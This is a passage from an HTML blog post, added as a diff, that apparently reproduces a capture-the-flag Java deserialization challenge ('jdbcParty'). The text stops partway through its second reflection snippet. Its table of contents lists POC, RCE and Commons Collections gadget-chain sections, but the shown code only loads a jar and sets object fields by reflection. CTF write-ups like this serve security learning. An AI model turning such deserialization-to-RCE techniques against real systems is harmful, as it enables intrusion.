@@ -1,0 +1,2023 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="比赛题目的复现">
+<title>Post_jdbcParty</title>
+
+<link rel='canonical' href='https://66lueflam144.github.io/p/post_jdbcparty/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Post_jdbcParty">
+<meta property='og:description' content="比赛题目的复现">
+<meta property='og:url' content='https://66lueflam144.github.io/p/post_jdbcparty/'>
+<meta property='og:site_name' content='Real One x86'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='JAVA' /><meta property='article:tag' content='反序列化' /><meta property='article:published_time' content='2025-03-09T14:17:11&#43;08:00'/><meta property='article:modified_time' content='2025-03-09T14:17:11&#43;08:00'/><meta property='og:image' content='https://66lueflam144.github.io/p/post_jdbcparty/drink2_png.png' />
+<meta name="twitter:title" content="Post_jdbcParty">
+<meta name="twitter:description" content="比赛题目的复现"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://66lueflam144.github.io/p/post_jdbcparty/drink2_png.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu12036493284228052079.png" width="300"
+                            height="398" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤠</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Real One x86</a></h1>
+            <h2 class="site-description">La Vida Loca</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://66lueflam144.github.io/'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="2 4" stroke-dashoffset="6" d="M12 3c4.97 0 9 4.03 9 9c0 4.97 -4.03 9 -9 9"><animate attributeName="stroke-dashoffset" dur="0.6s" repeatCount="indefinite" values="6;0"/></path><path stroke-dasharray="32" stroke-dashoffset="32" d="M12 21c-4.97 0 -9 -4.03 -9 -9c0 -4.97 4.03 -9 9 -9"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.1s" dur="0.4s" values="32;0"/></path><path stroke-dasharray="10" stroke-dashoffset="10" d="M12 8v7.5"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.5s" dur="0.2s" values="10;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 15.5l3.5 -3.5M12 15.5l-3.5 -3.5"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.7s" dur="0.2s" values="6;0"/></path></g></svg>
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none"><path fill="currentColor" d="m6 14l7-12v8h5l-7 12v-8z" opacity=".16"/><path stroke="currentColor" stroke-linejoin="round" stroke-width="2" d="m6 14l7-12v8h5l-7 12v-8z"/></g></svg>
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="28" stroke-dashoffset="28" d="M12 10l4 7h-8Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="28;0"/></path><path d="M12 10l4 7h-8Z" opacity="0"><animate attributeName="d" begin="0.4s" dur="0.8s" keyTimes="0;0.25;1" repeatCount="indefinite" values="M12 10l4 7h-8Z;M12 4l9.25 16h-18.5Z;M12 4l9.25 16h-18.5Z"/><animate attributeName="opacity" begin="0.4s" dur="0.8s" keyTimes="0;0.1;0.75;1" repeatCount="indefinite" values="0;1;1;0"/></path></g></svg>
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-opacity="0" d="M12 3l2.35 5.76l6.21 0.46l-4.76 4.02l1.49 6.04l-5.29 -3.28l-5.29 3.28l1.49 -6.04l-4.76 -4.02l6.21 -0.46Z"><animate fill="freeze" attributeName="fill-opacity" begin="0.5s" dur="0.15s" values="0;0.3"/></path><path fill="none" stroke="currentColor" stroke-dasharray="36" stroke-dashoffset="36" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3L9.65 8.76L3.44 9.22L8.2 13.24L6.71 19.28L12 16M12 3L14.35 8.76L20.56 9.22L15.8 13.24L17.29 19.28L12 16"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="36;0"/><animate attributeName="d" dur="1.5s" repeatCount="indefinite" values="M12 3L9.65 8.76L3.44 9.22L8.2 13.24L6.71 19.28L12 16M12 3L14.35 8.76L20.56 9.22L15.8 13.24L17.29 19.28L12 16;M12 7L10.82 10.38L7.24 10.45L10.1 12.62L9.06 16.05L12 14M12 7L13.18 10.38L16.76 10.45L13.9 12.62L14.94 16.05L12 14;M12 3L9.65 8.76L3.44 9.22L8.2 13.24L6.71 19.28L12 16M12 3L14.35 8.76L20.56 9.22L15.8 13.24L17.29 19.28L12 16"/></path></svg>
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#pre">Pre</a></li>
+    <li><a href="#jar-文件的处理">jar 文件的处理</a>
+      <ol>
+        <li><a href="#直接反射调用">直接反射调用</a></li>
+        <li><a href="#解析jar之后反射调用">解析JAR之后反射调用</a>
+          <ol>
+            <li><a href="#jar解析">jar解析</a></li>
+            <li><a href="#反射调用">反射调用</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#序列化处理">序列化处理</a>
+      <ol>
+        <li><a href="#分析一下">分析一下</a></li>
+      </ol>
+    </li>
+    <li><a href="#重新分析">重新分析</a>
+      <ol>
+        <li><a href="#jdk-17的限制">JDK 17+的限制</a></li>
+        <li><a href="#限制的原因">限制的原因</a></li>
+        <li><a href="#unsafe">Unsafe</a>
+          <ol>
+            <li><a href="#番外通过unsafe修改string-x">番外——通过Unsafe修改String x</a></li>
+          </ol>
+        </li>
+        <li><a href="#rmi">RMI</a></li>
+        <li><a href="#poc">POC</a></li>
+        <li><a href="#rce">RCE</a></li>
+      </ol>
+    </li>
+    <li><a href="#compare">compare</a>
+      <ol>
+        <li><a href="#cc1-overview">CC1 Overview</a></li>
+        <li><a href="#end">END</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/post_jdbcparty/">
+                <img src="/p/post_jdbcparty/drink2_png_hu1216953269887604255.png"
+                        srcset="/p/post_jdbcparty/drink2_png_hu1216953269887604255.png 800w, /p/post_jdbcparty/drink2_png_hu17834855119651448608.png 1600w"
+                        width="800" 
+                        height="533" 
+                        loading="lazy"
+                        alt="Featured image of post Post_jdbcParty" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/post_jdbcparty/">Post_jdbcParty</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            比赛题目的复现
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 09, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <blockquote>
+<p>是01-05的一个比赛的题目。当时知道是用序列化，但没想起来反射这一个，所以没有做出来。假期休息了三个还是两个星期之后又回来研究这一个。</p>
+</blockquote>
+<h2 id="pre">Pre
+</h2><p>题目除了给了一个网站就是给了一个jar文件</p>
+<p>大概猜到是使用java 反射和序列化相关。</p>
+<hr>
+<hr>
+<h2 id="jar-文件的处理">jar 文件的处理
+</h2><blockquote>
+<p>现阶段核心思想是，如何在jar文件上进行反射调用</p>
+</blockquote>
+<ul>
+<li>在jar上直接进行反射调用</li>
+<li>解析jar之后再进行反射调用</li>
+</ul>
+<hr>
+<h3 id="直接反射调用">直接反射调用
+</h3><p>按照之前学到的反射调用方法，直接通过路径调用</p>
+<ul>
+<li><code>URL</code></li>
+<li><code>classLoader</code></li>
+<li><code>forName</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SevenRings</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用 file:// 协议来指定本地文件路径  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="o">[]</span><span class="w"> </span><span class="n">classloaderUrls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;file:///D:/JavaOut_File/workshit/liveawayfromme/src/lib/jdbcc.jar&#34;</span><span class="p">)};</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URLClassLoader</span><span class="w"> </span><span class="n">urlClassLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="p">(</span><span class="n">classloaderUrls</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 通过反射加载 User 类  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.example.jdbcparty.model.User&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">urlClassLoader</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建实例  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">user01</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 修改字段值  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">namField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">namField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">namField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">user01</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;sue&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Updated username: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">namField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">user01</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">pswField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pswField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pswField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">user01</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1234&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Updated password: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pswField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">user01</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果就是，在第一步就卡住：“ClassNotFound”。后面的是否调用就没有必要说了。</p>
+<p>根据记忆，在此失败结果基础上，还进行过的努力：</p>
+<ul>
+<li>通过IDEA Intellj 导入jar</li>
+<li>把jar放到<code>lib</code>目录下试图调用</li>
+<li>修改JDK版本</li>
+</ul>
+<p>毫无效果。</p>
+<hr>
+<blockquote>
+<p>导入lib中的jar</p>
+</blockquote>
+<p>贴一个试图导入lib中的jar的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 1. 获取主 JAR 文件路径  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">jarFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&#34;D:\\JavaOut_File\\workshit\\liveawayfromme\\src\\lib\\jdbcc.jar&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 2. 创建 URLClassLoader 加载 JAR 文件  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">urls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 加载主 JAR 文件  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">urls</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">jarFile</span><span class="p">.</span><span class="na">toURI</span><span class="p">().</span><span class="na">toURL</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 3. 加载 BOOT-INF/lib/ 目录下的所有 JAR 文件  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">libDir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">jarFile</span><span class="p">.</span><span class="na">getParent</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;BOOT-INF/lib&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">libDir</span><span class="p">.</span><span class="na">exists</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">libDir</span><span class="p">.</span><span class="na">isDirectory</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">File</span><span class="o">[]</span><span class="w"> </span><span class="n">libFiles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libDir</span><span class="p">.</span><span class="na">listFiles</span><span class="p">((</span><span class="n">dir</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">name</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&#34;.jar&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">File</span><span class="w"> </span><span class="n">lib</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">libFiles</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">urls</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">lib</span><span class="p">.</span><span class="na">toURI</span><span class="p">().</span><span class="na">toURL</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建 URLClassLoader  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URLClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="p">(</span><span class="n">urls</span><span class="p">.</span><span class="na">toArray</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 4. 读取 JAR 文件中的类  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JarFile</span><span class="w"> </span><span class="n">jar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JarFile</span><span class="p">(</span><span class="n">jarFile</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">jar</span><span class="p">.</span><span class="na">stream</span><span class="p">()</span><span class="w">  
